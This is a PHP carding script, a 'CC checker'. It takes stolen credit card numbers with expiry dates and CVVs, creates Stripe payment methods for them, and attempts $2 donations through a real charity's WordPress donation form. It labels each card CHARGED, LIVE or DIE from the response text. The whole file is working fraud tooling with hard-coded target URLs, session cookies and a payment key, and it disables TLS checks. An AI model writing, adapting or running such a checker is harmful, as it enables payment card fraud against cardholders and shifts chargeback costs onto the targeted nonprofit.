<?php 
////////////////////////////////////////////////////////
require 'function.php';

error_reporting(0);
date_default_timezone_set('America/New_York');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}

function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);  
    return $str[0];
}

function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}

$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];
$last4 = substr($cc, -4);

$ch = curl_init();



#------[Email Generator]------#



function emailGenerate($length = 10)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString . '@gmail.com';
}
$email = emailGenerate();
#------[Username Generator]------#
function usernameGen($length = 13)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$un = usernameGen();
#------[Password Generator]------#
function passwordGen($length = 15)
{
    $characters       = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $charactersLength = strlen($characters);
    $randomString     = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}
$pass = passwordGen();

curl_close($ch);

$number1 = substr($ccn,0,4);
$number2 = substr($ccn,4,4);
$number3 = substr($ccn,8,4);
$number4 = substr($ccn,12,4);
$number6 = substr($ccn,0,6);

function value($str,$find_start,$find_end) {
    $start = @strpos($str,$find_start);
    if ($start === false) {
        return "";
    }
    $length = strlen($find_start);
    $end = strpos(substr($str,$start +$length),$find_end);
    return trim(substr($str,$start +$length,$end));

}

function mod($dividendo,$divisor)
{
    return round($dividendo - (floor($dividendo/$divisor)*$divisor));
}

////////////////////////////===[1 Req]

sleep(1);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /v1/payment_methods h2',
'Host: api.stripe.com',
'sec-ch-ua: "Not)A;Brand";v="24", "Chromium";v="116"',
'accept: application/json',
'content-type: application/x-www-form-urlencoded',
'sec-ch-ua-mobile: ?1',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36',
'sec-ch-ua-platform: "Android"',
'origin: https://js.stripe.com',
'sec-fetch-site: same-site',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://js.stripe.com/',
'accept-language: en-US,en;q=0.9',
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');

////////////////////////////===[1 Req Postfields]

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&billing_details[name]=Henry&billing_details[email]=simplefour5%40gmail.com&billing_details[address][postal_code]=76444&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=71663723-ebe2-4244-984f-f140b11cda1089b97f&muid=6bcb2db3-c093-40d2-b810-737121eccc469cde5d&sid=d62dfe47-a08b-41b2-9f6d-a32fdd39272cc9f39b&pasted_fields=number&payment_user_agent=stripe.js%2Fab4f93f420%3B+stripe-js-v3%2Fab4f93f420%3B+card-element&referrer=https%3A%2F%2Fsmofi.org&time_on_page=85953&key=pk_live_XFaj9PqKqAqT7rX1Fh5lKR8o00dy0m7DqG');

$result1 = curl_exec($ch);
$id = trim(strip_tags(getStr($result1,'"id": "','"')));
$country1 = trim(strip_tags(getStr($result1,'"country": "','"')));
$funding1 = trim(strip_tags(getStr($result1,'"funding": "','"')));

////////////////////////////===[2 Req]

sleep(10);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL,$url);
curl_setopt($ch, CURLOPT_URL, 'https://smofi.org/wp-admin/admin-ajax.php');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd().'/cookie.txt');
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
'POST /wp-admin/admin-ajax.php h2',
'Host: smofi.org',
'sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
'accept: application/json, text/javascript, */*; q=0.01',
'content-type: application/x-www-form-urlencoded; charset=UTF-8',
'x-requested-with: XMLHttpRequest',
'sec-ch-ua-mobile: ?1',
'user-agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Mobile Safari/537.36',
'sec-ch-ua-platform: "Android"',
'origin: https://smofi.org',
'sec-fetch-site: same-origin',
'sec-fetch-mode: cors',
'sec-fetch-dest: empty',
'referer: https://smofi.org/donations/',
'accept-language: en-US,en;q=0.9',
'cookie: __stripe_mid=6bcb2db3-c093-40d2-b810-737121eccc469cde5d',
'cookie: charitable_session=557a0b5fac1cc7db726e7d11aa0b1beb||86400||82800',
));



////////////////////////////===[2 Req Postfields]

curl_setopt($ch, CURLOPT_POSTFIELDS,'charitable_form_id=6750324f45304&6750324f45304=&_charitable_donation_nonce=be7b39a7e9&_wp_http_referer=%2Fdonations%2F&campaign_id=2600&description=Donations+to+SMOFI&ID=0&donation_amount=custom&custom_donation_amount=2.00&first_name=Henry&last_name=Luke&phone_number=%2B12018987687&email='.$email.'&donor_comment=&gateway=stripe&stripe_payment_method='.$id.'&action=make_donation&form_action=make_donation');

$result = curl_exec($ch); // Execute the cURL request
$json_result = json_decode($result, True);
$msg = $json_result["errors"];


////////////////////////////===[Responses CVV]===////////////////////////////

sleep(1);
if
(strpos($result,  '"requires_action":true,"secret":')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>CHARGED CC: `$cc|$mes|$ano|$cvv` </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>RESULT : Payment successful ✅</i></font><br> <font class='badge badge-dark'> $bank $country Checked By : @BINSTRIPE </i></font><br>";
}

elseif
(strpos($result,  'invalid_cvv')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>LIVE CC: `$cc|$mes|$ano|$cvv` </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>RESULT : CCN LIVE ✅</i></font><br> <font class='badge badge-dark'> $bank $country Checked By : @BINSTRIPE </i></font><br>";
}

elseif
(strpos($result,  'Your card does not support this type of purchase.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>LIVE CC: `$cc|$mes|$ano|$cvv` </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>RESULT : CCN LIVE ✅</i></font><br> <font class='badge badge-dark'> $bank $country Checked By : @BINSTRIPE </i></font><br>";
}
elseif
(strpos($result,  'authentication required')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>LIVE CC: `$cc|$mes|$ano|$cvv` </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>RESULT : CCN LIVE ✅</i></font><br> <font class='badge badge-dark'> $bank $country Checked By : @BINSTRIPE </i></font><br>";
}
elseif
(strpos($result,  'Your card security code is invalid.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>LIVE CC: `$cc|$mes|$ano|$cvv` </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>RESULT : CCN LIVE ✅</i></font><br> <font class='badge badge-dark'> $bank $country Checked By : @BINSTRIPE </i></font><br>";
}

elseif
(strpos($result,  "Your card's security code is invalid.")) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>LIVE CC: `$cc|$mes|$ano|$cvv` </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>RESULT : CCN LIVE ✅</i></font><br> <font class='badge badge-dark'> $bank $country Checked By : @BINSTRIPE </i></font><br>";
}
elseif
(strpos($result,  'Invalid account.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>LIVE CC: `$cc|$mes|$ano|$cvv` </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>RESULT : CCN LIVE ✅</i></font><br> <font class='badge badge-dark'> $bank $country Checked By : @BINSTRIPE </i></font><br>";
}
elseif
(strpos($result,  'Your card security code is invalid.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>LIVE CC: `$cc|$mes|$ano|$cvv` </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>RESULT : CCN LIVE ✅</i></font><br> <font class='badge badge-dark'> $bank $country Checked By : @BINSTRIPE </i></font><br>";
}

elseif
(strpos($result,  'Your card insufficient funds.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>LIVE CC: `$cc|$mes|$ano|$cvv` </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>RESULT : INSUFFICENT FUNDS ✅ </i></font><br> <font class='badge badge-dark'> $bank $country Checked By : @BINSTRIPE </i></font><br>";
}

elseif
(strpos($result,  'Your card has insufficient funds.')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>LIVE CC: `$cc|$mes|$ano|$cvv` </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>RESULT : CCN LIVE ✅</i></font><br> <font class='badge badge-dark'> $bank $country Checked By : @BINSTRIPE </i></font><br>";
}

elseif
(strpos($result,  "Your card's security code is incorrect.")) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>LIVE CC: `$cc|$mes|$ano|$cvv` </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>RESULT : CCN LIVE ✅</i></font><br> <font class='badge badge-dark'> $bank $country Checked By : @BINSTRIPE </i></font><br>";
}

elseif
(strpos($result,  'Your card does not support this type of purchase')) {
  echo "<font size=2 color='red'>  <font class='badge badge-dark'>LIVE CC: `$cc|$mes|$ano|$cvv` </span></i></font> <br> <font size=2 color='red'><font class='badge badge-dark'>RESULT : CVV LIVE ✅ </i></font><br> <font class='badge badge-dark'> $bank $country Checked By : @BINSTRIPE ⚡ </i></font><br>";
}

elseif
(strpos($result,  "Missing payment details.")) {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>DIE CC: $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>RESULT : Your card has expired. ❌ </i></font><br>";
}

else {
  echo "<font size=2 color='red'>  <font class='badge badge-danger'>DIE CC: $cc|$mes|$ano|$cvv </span></i></font> <br> <font size=2 color='red'><font class='badge badge-danger'>RESULT : Your card was declined ❌ </i></font><br>";
}

curl_close($ch);
ob_flush();

//echo $result1;

////////////////////////////////////////////////////////
?>
